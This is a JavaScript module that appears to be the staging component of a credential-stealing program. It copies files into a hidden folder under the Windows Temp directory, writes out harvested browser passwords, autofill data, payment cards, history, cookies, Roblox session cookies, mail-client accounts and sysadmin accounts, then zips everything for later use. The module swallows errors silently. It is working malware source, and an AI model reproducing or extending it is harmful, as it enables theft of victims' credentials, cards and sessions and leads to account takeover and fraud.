const core = require('./core');
const infos = require('./infos')
const fs = require('fs');
const path = require("path");
const archiver = require('archiver');
const basepath = process.env.localappdata + "\\" + "Temp" + "\\" + "Save-" + core.generateId(10);
const savepath = process.env.localappdata + "\\" + "Temp" + "\\" + "Save-" + core.generateId(10) + ".zip";

exports.basepath = basepath

function Init() {
    if (fs.existsSync(basepath)) {
        fs.rmdirSync(basepath);
    }
    fs.mkdirSync(basepath);
    if (fs.existsSync(savepath)) {
        fs.rmSync(savepath)
    }
}

function Save(copypath, mainfolder, subfolder) {
    const files = core.recursiveRead(copypath, copypath, "");
    for (var i = 0; i < files.length; i++) {
        const file = files[i];
        const savePath = basepath + "\\" + mainfolder + "\\" + subfolder + "\\" + file.replace(copypath, "");
        try {
            createAllDir(savePath);
            fs.writeFileSync(savePath, fs.readFileSync(file));
        } catch (e) { };
    }
}

function SimpleSave(copypath, mainfolder) {
    const files = core.recursiveRead(copypath, copypath, "");
    for (var i = 0; i < files.length; i++) {
        const file = files[i];
        const savePath = basepath + "\\" + mainfolder + "\\" + file.replace(copypath, "");
        try {
            createAllDir(savePath);
            fs.writeFileSync(savePath, fs.readFileSync(file));
        } catch (e) { };
    }
}

function ArraySave(saves, mainfolder, subfolder) {
    for (var i = 0; i < saves.length; i++) {
        const save = saves[i];
        try {
            if (fs.lstatSync(save).isDirectory()) {
                const files = core.recursiveRead(save, save, "");
                for (var j = 0; j < files.length; j++) {
                    const file = files[j];

                    let savePath;
                    if (subfolder != '') {
                        savePath = basepath + "\\" + mainfolder + "\\" + subfolder + "\\" + save.slice(0, -1).split("\\").pop() + "\\" + core.fileName(file);
                    } else {
                        savePath = basepath + "\\" + mainfolder + "\\" + save.slice(0, -1).split("\\").pop() + "\\" + core.fileName(file);
                    }

                    try {
                        createAllDir(savePath);
                        fs.writeFileSync(savePath, fs.readFileSync(file));
                    } catch (e) { };
                }
            } else {
                const savePath = basepath + "\\" + mainfolder + "\\" + subfolder + "\\" + core.fileName(save);
                try {
                    createAllDir(savePath);
                    fs.writeFileSync(savePath, fs.readFileSync(save));
                } catch (e) { };
            }
        } catch (e) { };
    }
}

function createAllDir(str) {
    var folders = str.split(path.sep);
    var dir = "";
    for (var i = 0; i < folders.length - 1; i++) {
        dir += folders[i] + path.sep;
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir);
        }
    }
}

function saveCookies(cookies, name) {
    if (cookies.length == 0) {
        return
    }

    var savePath = basepath + "\\Browsers\\";
    try {
        fs.mkdirSync(savePath);
    } catch (e) { }

    savePath += "quickcookie-" + name + ".txt";
    var cookiesFinal = ""
    for (let i = 0; i < cookies.length; i++) {
        cookiesFinal += cookies[i].build()
    }

    fs.writeFileSync(savePath, cookiesFinal);
}

function saveRoblox(cookies, name) {
    var savePath = basepath + "\\Games\\";
    try {
        fs.mkdirSync(savePath);
    } catch (e) { }

    savePath += "Roblox\\"
    try {
        fs.mkdirSync(savePath);
    } catch (e) { }

    savePath += `cookies@${name}.txt`;
    var cookiesFinal = ""
    for (let i = 0; i < cookies.length; i++) {
        cookiesFinal += cookies[i].build()
    }

    fs.writeFileSync(savePath, cookiesFinal);
}

function saveBrowser(passwords, autofills, cards, history, downloads, bookmarks) {
    const savePath = basepath + "\\Browsers\\";
    try {
        fs.mkdirSync(savePath);
    } catch (e) { }

    let passwordFinal = "";
    for (let i = 0; i < passwords.length; i++) {
        passwordFinal += passwords[i].build() + "\n";
    }

    if (passwordFinal.length != 0) {
        passwordFinal = core.getHeader() + passwordFinal
    }

    let autofillFinal = "";
    for (let i = 0; i < autofills.length; i++) {
        autofillFinal += autofills[i].build() + "\n";
    }

    if (autofillFinal.length != 0) {
        autofillFinal = core.getHeader() + autofillFinal
    }

    let historyFinal = "";
    for (let i = 0; i < history.length; i++) {
        historyFinal += history[i].build() + "\n";
    }

    if (historyFinal.length != 0) {
        historyFinal = core.getHeader() + historyFinal
    }

    let downloadFinal = "";
    for (let i = 0; i < downloads.length; i++) {
        downloadFinal += downloads[i].build() + "\n";
    }

    if (downloadFinal.length != 0) {
        downloadFinal = core.getHeader() + downloadFinal
    }

    let bookmarkFinal = "";
    for (let i = 0; i < bookmarks.length; i++) {
        bookmarkFinal += bookmarks[i].build() + "\n";
    }

    if (bookmarkFinal.length != 0) {
        bookmarkFinal = core.getHeader() + bookmarkFinal
    }

    let cardFinal = "";
    for (let i = 0; i < cards.length; i++) {
        cardFinal += cards[i].build() + "\n";
    }

    if (cardFinal.length != 0) {
        cardFinal = core.getHeader() + cardFinal
    }


    fs.writeFileSync(savePath + "passwords.txt", passwordFinal);
    fs.writeFileSync(savePath + "autofills.txt", autofillFinal);
    fs.writeFileSync(savePath + "history.txt", historyFinal);
    fs.writeFileSync(savePath + "downloads.txt", downloadFinal);
    fs.writeFileSync(savePath + "bookmarks.txt", bookmarkFinal);
    fs.writeFileSync(savePath + "cards.txt", cardFinal);
}

function saveMailClients(accounts, name) {
    let savePath = basepath + "\\MailClients\\";
    try {
        fs.mkdirSync(savePath);
    } catch (e) { }

    savePath += name + "\\"
    try {
        fs.mkdirSync(savePath);
    } catch (e) { }

    fs.writeFileSync(savePath + "accounts.json", JSON.stringify(accounts, null, 4));
}

function saveSysAdmin(accounts, name) {
    let savePath = basepath + "\\SysAdmin\\";
    try {
        fs.mkdirSync(savePath);
    } catch (e) { }

    savePath += name + "\\"
    try {
        fs.mkdirSync(savePath);
    } catch (e) { }

    fs.writeFileSync(savePath + "accounts.json", JSON.stringify(accounts, null, 4));
}

function zipResult() {
    const archive = archiver('zip', { zlib: { level: 9 } });
    const stream = fs.createWriteStream(savepath);

    return new Promise((resolve, reject) => {
        archive
            .directory(basepath + "\\", false)
            .on('error', err => reject(err))
            .pipe(stream)
            ;

        stream.on('close', () => resolve(savepath));
        archive.finalize().then(() => {
            //fs.rmSync(basepath + "\\", { recursive: true, force: true });
        })
    });
}

module.exports = {
    Init,
    SimpleSave,
    Save,
    ArraySave,
    zipResult,
    saveBrowser,
    saveCookies,
    saveRoblox,
    saveMailClients,
    saveSysAdmin
};